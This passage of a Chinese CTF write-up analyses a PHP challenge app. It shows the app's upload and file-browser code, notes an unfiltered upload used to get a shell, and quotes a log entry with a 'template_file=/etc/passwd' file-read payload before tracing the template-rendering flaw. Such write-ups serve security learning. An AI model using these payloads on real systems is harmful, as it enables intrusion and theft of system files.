class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.thumbh'</span><span class="token punctuation">,</span><span class="token variable">$thumbh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">thumbw</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">thumbw</span> <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token variable">$thumbw</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">thumbw</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">thumbh</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">thumbh</span> <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token variable">$thumbh</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">thumbh</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">type</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.type'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//类型</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">myid</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.myid'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回容器内容的值</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">iframe</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.iframe'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回的iframe容器</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">field</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.field'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">returntype</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.returntype'</span><span class="token punctuation">,</span><span class="token string">'multiple'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回文件的个数类型，单个-single，多个-multiple，默认是多个</span>            <span class="token comment" spellcheck="true">//控制上传文件大小</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filesize</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.filesize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filesize</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">type</span> <span class="token operator">==</span> <span class="token string">'images'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filesize</span> <span class="token operator">=</span> <span class="token number">3072</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//图片默认3M</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filesize</span> <span class="token operator">=</span> <span class="token number">102400</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//附件默认100M</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//上传目录</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">savedir</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.savedir'</span><span class="token punctuation">,</span><span class="token string">'uploadfile'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * [del 上传文件]     * @return [type] [description]     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">IS_POST</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'post.oringinal_type'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$location</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'post.location'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$location</span> <span class="token operator">==</span> <span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">==</span> <span class="token string">'images'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'post.photo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$thumb</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'post.thumb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token variable">$photo</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token variable">$photo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token variable">$thumb</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token variable">$thumb</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token variable">$savepathall</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'post.savepathall'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token variable">$savepathall</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token variable">$savepathall</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">success</span><span class="token punctuation">(</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string">'_DEL_SUCCESS_'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string">'_ACCESS_ERROR_'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * [files 获取本地文件]     * @return [type]        [description]     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">files</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//上传类型</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">returntype</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.returntype'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取类型</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">savedir</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.savedir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取类型</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">type</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.type'</span><span class="token punctuation">,</span><span class="token string">'files'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//返回容器</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">origin_domid</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.myid'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//返回容器的iframe</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">iframe</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//最原始目录</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">oringi_path</span> <span class="token operator">=</span> <span class="token string">"./Public/Uploads/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">savedir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">type</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取目录</span>        <span class="token variable">$uploadfilePath</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'get.dir'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$uploadfilePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$uploadfilePath</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">oringi_path</span><span class="token punctuation">.</span><span class="token string">"/*"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$uploadfilePath</span> <span class="token operator">=</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$uploadfilePath</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"/*"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//取出来的中文会乱码，暂时不考虑</span>        <span class="token variable">$dirs</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$uploadfilePath</span><span class="token punctuation">,</span><span class="token constant">GLOB_NOESCAPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$dirall</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$dirs</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//判断文件类型</span>                <span class="token variable">$pathinfo</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$imagesarr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">,</span><span class="token string">'bmp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pathinfo</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$imagesarr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$pathinfo</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'images'</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token variable">$pathinfo</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'files'</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"./Public/images/uploadfile/"</span><span class="token punctuation">.</span><span class="token variable">$pathinfo</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$pathinfo</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'readme'</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token variable">$pathinfo</span><span class="token punctuation">[</span><span class="token string">'filepath'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$dirall</span><span class="token punctuation">[</span><span class="token string">'files'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$pathinfo</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$dirarr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token string">'pathname'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$dirall</span><span class="token punctuation">[</span><span class="token string">'dirs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$dirarr</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//当前目录</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$uploadfilePath</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$uploadfilePath</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//上一目录</span>        <span class="token variable">$prevarr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$prevarr</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$prevarr</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$prevpath</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token variable">$prevarr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">prevpath</span> <span class="token operator">=</span> <span class="token variable">$prevpath</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token variable">$dirall</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两种上传操作，第一种是图片的上传，满足判断条件后调用uploadPhoto；</p><p>而第二种是其他文件的上传，没有任何过滤。（我们就利用这点来getshell）</p><p><img src="/2020/05/04/2019-redhat/touzi6.png" alt="upload"></p><h3 id="漏洞2-日志泄露-ssti模板注入"><a href="#漏洞2-日志泄露-ssti模板注入" class="headerlink" title="漏洞2 日志泄露+ssti模板注入"></a>漏洞2 日志泄露+ssti模板注入</h3><h4 id="日志泄露"><a href="#日志泄露" class="headerlink" title="日志泄露"></a>日志泄露</h4><p>漏洞文件：\www\Apps\Runtime\Logs\Home\19_11_20.log</p><pre><code>[ 2019-11-20T00:43:54+08:00 ] 127.0.0.1 /aikehou/echo/index.php/Jquery/?template_file=/etc/passwd</code></pre><p>可以看出这是主办方直接测试用的payload，稍加改动即可去读flag。</p><h4 id="ssti模板注入（不理解）"><a href="#ssti模板注入（不理解）" class="headerlink" title="ssti模板注入（不理解）"></a>ssti模板注入（不理解）</h4><p>上述可以直接读flag源于ssti模板注入造成的前台任意文件读取，跟踪下过程。</p><p> 漏洞文件：Apps/Home/Controller/JqueryController.class.php </p><p>在sublime里对template_file进行find in folder，得到的第一条正好是漏洞文件所在路径，双击框选部分直接跳转到目标代码。</p><p><img src="/2020/05/04/2019-redhat/touzi1.png" alt="粤湾投资"></p><p><strong>漏洞函数：index()</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'template_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">seoData</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'title'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'Jquery插件'</span><span class="token punctuation">,</span> <span class="token string">'keywords'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'Jquery插件'</span><span class="token punctuation">,</span> <span class="token string">'description'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'Jquery插件'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'template_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token shell-comment comment">#  display函数对template_file进行处理</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Goto Definition1</strong></p><p><img src="/2020/05/04/2019-redhat/touzi2.png" alt="粤湾投资"></p><p> 在Controller.class.php中，直接将我们传递的template_file参数代入进display方法中，跟进：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">display</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">view</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>Goto Definition2</strong></p><p><img src="/2020/05/04/2019-redhat/touzi3.png" alt="粤湾投资"></p><p> 这里除了<code>$templateFile</code>，其余传递参数都为空，这里将templateFile传递进了fetch()方法。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">display</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">G</span><span class="token punctuation">(</span><span class="token string">'viewStartTime'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 视图开始标签</span>        Hook<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string">'view_begin'</span><span class="token punctuation">,</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 解析并获取模板内容</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 输出模板内容</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 视图结束标签</span>        Hook<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string">'view_end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Goto Definition3</strong></p><p><code>$this-&gt;fetch</code>，肯定就是在当前php文件里找了</p><p><img src="/2020/05/04/2019-redhat/touzi4.png" alt="粤湾投资"></p><p>这里可以将传入的<code>$templateFile</code>直接当做模板渲染，<code>param string $content</code> 模板输出内容。</p><pre class="line-numbers language-php"><code class="language-php">    <span class="token comment" spellcheck="true">/**     * 解析和获取模板内容 用于输出     * @access public     * @param string $templateFile 模板文件名     * @param string $content 模板输出内容     * @param string $prefix 模板缓存前缀     * @return string     */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$templateFile</span>   <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseTemplate</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 